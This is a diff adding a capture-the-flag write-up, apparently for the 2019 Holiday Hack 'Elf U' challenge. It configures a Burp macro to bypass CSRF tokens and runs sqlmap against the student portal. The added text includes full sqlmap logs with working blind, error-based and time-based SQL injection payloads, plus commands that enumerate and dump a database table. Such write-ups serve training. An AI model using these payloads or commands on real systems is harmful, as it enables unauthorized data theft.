@@ -2841,13 +2841,266 @@ The code for this challenge is `8Ia8LiZEwvyZr2WO`.
 ### Retrieve Scraps of Paper from Server
 #### Context
 Objective
->
+> Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there.
+> What is the name of Santa's cutting-edge sleigh guidance system?
+> For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.
+
+
+Hint:
+Krampus
+> You did it!  Thank you so much.  I can trust you!
+> To help you, I have flashed the firmware in your badge to unlock a useful new feature: magical teleportation through the steam tunnels.
+> As for those scraps of paper, I scanned those and put the images on my server.
+> I then threw the paper away.
+> Unfortunately, I managed to lock out my account on the server.
+> Hey! You’ve got some great skills. Would you please hack into my system and retrieve the scans?
+> I give you permission to hack into it, solving Objective 9 in your badge.
+> And, as long as you're traveling around, be sure to solve any other challenges you happen across.
+
+
+Pepper Minstix
+> That's it - hooray!
+> Have you had any luck retrieving scraps of paper from the Elf U server?
+> You might want to look into SQL injection techniques.
+> OWASP is always a good resource for web attacks.
+> For blind SQLi, I've heard Sqlmap is a great tool.
+> In certain circumstances though, you need custom tamper scripts to get things going!
+> ...
+
+
+Completed message:
+Krampus
+> Wow!  We’ve uncovered quite a nasty plot to destroy the holiday season.
+> We’ve gotta stop whomever is behind it!
+> I managed to find this protected document on one of the compromised machines in our environment.
+> I think our attacker was in the process of exfiltrating it.
+> I’m convinced that it is somehow associated with the plan to destroy the holidays.  Can you decrypt it?
+> There are some smart people in the NetWars challenge room who may be able to help us.
+
+
+Portal url:  
+https://studentportal.elfu.org/
+
 
 #### Solution
+While playing around with the application, we notice very quickly that it uses special csrf tokens.
+We will use burp as a proxy for our SQL injection, we can leave it to burp to handle grabbing the token and updating the request.
+
+Burp config:
+- Make a new macro (project options -> macro) called 'Get-Csrf'
+- Capture a request made to https://studentportal.elfu.org/validator.php
+- Select configure item, unselect any rules regarding cookies and create a new one for 'Custom Parameter Locations'
+- Parameter name: 'token'
+- Start after expression: '\r\n\r\n'
+- End at delimiter: '$'
+
+This will select the csrf token returned by the request to /validator.php
+Now add a new Session handling rule (project options -> Session Handling)
+- Click on add
+- Call it add_token
+- Go to scope tab and enable the 'Proxy' functionality. Also select a proper scope 'https://studentportal.elfu.org'
+- Go back to the details tab and add a rule 'run a macro'
+- select the macro we made before
+
+![Burp Config 1](images/burp_config_1.png)
+![Burp Config 2](images/burp_config_2.png)
+![Burp Config 3](images/burp_config_3.png)
+
+Burp is now configured properly to update the csrf token on the fly.
+
+We can now try a request to 
+```
+/application-check.php?elfmail=testelf%40gmail.com'&token=any_value_here (Note the single quote in the email field)
+```
+Because we proxy our request through burp, burp will automatically execute our macro and fetch the CSRF token for us.
+
+
+This will give us an SQL error:
+```
+Error: SELECT status FROM applications WHERE elfmail = 'testelf@gmail.com'';<br>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''testelf@gmail.com''' at line 1
+```
+
+Excellent. We can now let sqlmap work it's magic on this endpoint through burp.
+Note the `--proxy` flag to allow burp to work its magic.
+
+```
+root@pv-kali:~# sqlmap --proxy=http://localhost:8080 --url="https://studentportal.elfu.org/application-check.php?elfmail=testelf%40gmail.com&token=blah" -p elfmail
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.3.12#stable}
+|_ -| . [,]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:19:17 /2019-12-20/
+
+[12:19:17] [INFO] testing connection to the target URL
+[12:19:19] [INFO] checking if the target is protected by some kind of WAF/IPS
+[12:19:21] [INFO] testing if the target URL content is stable
+[12:19:23] [INFO] target URL content is stable
+[12:19:25] [INFO] heuristic (basic) test shows that GET parameter 'elfmail' might be injectable (possible DBMS: 'MySQL')
+[12:19:27] [INFO] heuristic (XSS) test shows that GET parameter 'elfmail' might be vulnerable to cross-site scripting (XSS) attacks
+[12:19:27] [INFO] testing for SQL injection on GET parameter 'elfmail'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[12:19:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[12:19:58] [WARNING] reflective value(s) found and filtering out
+[12:20:05] [INFO] GET parameter 'elfmail' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your application is still pending!")
+[12:20:05] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[12:20:07] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[12:20:08] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[12:20:10] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[12:20:12] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[12:20:14] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[12:20:15] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[12:20:17] [INFO] GET parameter 'elfmail' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[12:20:17] [INFO] testing 'MySQL inline queries'
+[12:20:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[12:20:19] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)
+[12:20:39] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[12:20:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[12:20:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[12:20:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[12:20:46] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[12:20:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[12:21:03] [INFO] GET parameter 'elfmail' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+[12:21:03] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[12:21:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[12:21:07] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[12:21:16] [INFO] target URL appears to have 1 column in query
+[12:21:23] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')
+[12:21:58] [INFO] target URL appears to be UNION injectable with 1 columns
+[12:22:05] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[12:22:46] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[12:23:21] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[12:23:55] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[12:24:30] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[12:25:05] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[12:25:41] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[12:26:17] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[12:26:53] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[12:27:29] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+GET parameter 'elfmail' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 277 HTTP(s) requests:
+---
+Parameter: elfmail (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: elfmail=testelf@gmail.com' AND 6563=6563 AND 'UmEA'='UmEA&token=blah
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: elfmail=testelf@gmail.com' AND (SELECT 2081 FROM(SELECT COUNT(*),CONCAT(0x71626a6271,(SELECT (ELT(2081=2081,1))),0x7176767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'IYVz'='IYVz&token=blah
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: elfmail=testelf@gmail.com' AND (SELECT 1767 FROM (SELECT(SLEEP(5)))ZSkF) AND 'rReh'='rReh&token=blah
+---
+[12:28:23] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0
+[12:28:23] [INFO] fetched data logged to text files under '/root/.sqlmap/output/studentportal.elfu.org'
+
+[*] ending @ 12:28:23 /2019-12-20/
+```
+Excellent, now sqlmap has al the info it needs to dump the database. So lets do exactly that. Instead of a full dump however, we will be a little bit more specific to save some time!
+We list all the databases in the table, we find the `elfu` database and list all its tables. We spot the `krampus` table. Which is what we will dump.
+
+```
+root@pv-kali:~# sqlmap --proxy=http://localhost:8080 --url="https://studentportal.elfu.org/application-check.php?elfmail=testelf%40gmail.com&token=blah" -p elfmail --dbs
+
+<< REDACTED FOR BREVITY >>
+
+available databases [2]:
+[*] elfu
+[*] information_schema
+
+
+root@pv-kali:~# sqlmap --proxy=http://localhost:8080 --url="https://studentportal.elfu.org/application-check.php?elfmail=testelf%40gmail.com&token=blah" -p elfmail -D elfu --tables
+
+<< REDACTED FOR BREVITY >>
+
+Database: elfu
+[3 tables]
++--------------+
+| applications |
+| krampus      |
+| students     |
++--------------+
+
+
+root@pv-kali:~# sqlmap --proxy=http://localhost:8080 --url="https://studentportal.elfu.org/application-check.php?elfmail=testelf%40gmail.com&token=blah" -p elfmail -D elfu -T krampus --dump
+
+<< REDACTED FOR BREVITY >>
+
+tabase: elfu
+Table: krampus
+[6 entries]
++----+-----------------------+
+| id | path                  |
++----+-----------------------+
+| 1  | /krampus/0f5f510e.png |
+| 2  | /krampus/1cc7e121.png |
+| 3  | /krampus/439f15e6.png |
+| 4  | /krampus/667d6896.png |
+| 5  | /krampus/adb798ca.png |
+| 6  | /krampus/ba417715.png |
++----+-----------------------+
+```
+
+Nice, we have the links to the images. We can now see all of them at
+- https://studentportal.elfu.org/krampus/0f5f510e.png
+- https://studentportal.elfu.org/krampus/1cc7e121.png
+- https://studentportal.elfu.org/krampus/439f15e6.png
+- https://studentportal.elfu.org/krampus/667d6896.png
+- https://studentportal.elfu.org/krampus/adb798ca.png
+- https://studentportal.elfu.org/krampus/ba417715.png
+
+![Scrap of Paper](images/scrap_of_paper_1.png)
+![Scrap of Paper](images/scrap_of_paper_2.png)
+![Scrap of Paper](images/scrap_of_paper_3.png)
+![Scrap of Paper](images/scrap_of_paper_4.png)
+![Scrap of Paper](images/scrap_of_paper_5.png)
+![Scrap of Paper](images/scrap_of_paper_6.png)
+
+We get all these scraps of paper. 
+If we use our Gimp / Photoshop / Paint skills, we can quickly piece these together and read the full note. 
+One piece is missing, so we do not know who sent the note. (Though the symbol is a giveaway)
+
+![Combined Scraps](images/scraps_combined.png)
+
+Full note:
+```
+################################################################
+# From the Desk of t                                           #
+#                                                              #
+# Date: August 23, 20                                          #
+#                                                              #
+# Memo to Self                                                 #
+#                                                              #
+# Finally! I've figured out how to destroy Christmas!          #
+# Santa has a brand new cutting edge sleigh guidance           #
+# technology, called the Super Sled-o-matic.                   #
+#                                                              #
+# I've figured out a way to poison the data going into the     #
+# system so that it will divert Santa's sled on Christmas      #
+# Eve!                                                         #
+#                                                              #
+# Santa will be unable to make the trip and the holiday        #
+# season will be destroyed! Santa's own technology will        #
+# undermine him!                                               #
+#                                                              #
+# That's what they deserve for not listening to my             #
+# suggestions for supporting other holiday characters!         #
+#                                                              #
+# Bwahahahahaha!                                               #
+################################################################
+```
+
 
 #### Code
-
-
+We obtain the code for this challenge: `Super Sled-o-matic`
 
 
 -----------------------------
@@ -2890,5 +3143,5 @@ Objective
 
 
 -----------------------------
-## Addendum
+## Bonus
 todo
